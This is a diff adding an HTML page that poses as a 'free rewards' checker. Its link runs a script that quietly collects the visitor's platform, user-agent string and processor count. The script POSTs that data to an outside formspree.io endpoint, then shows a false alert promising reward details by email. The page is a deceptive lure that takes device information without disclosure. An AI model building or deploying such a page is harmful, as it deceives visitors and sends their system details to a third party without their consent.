@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Check your free rewards achieved</title>
+</head>
+<body>
+    <a href="#" onclick="sendComputerDetails()">Click here</a> To View Your Rewards achieved till date!.
+    <script>
+        function sendComputerDetails() {
+            var details = {
+                'Operating System': navigator.platform,
+                'Operating System Version': navigator.userAgent,
+                'Processor': navigator.hardwareConcurrency
+            };
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://formspree.io/f/xoqoakjw', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(details));
+
+            alert('Rewards details will be sent to your email shortly.');
+        }
+    </script>
+</body>
+</html>
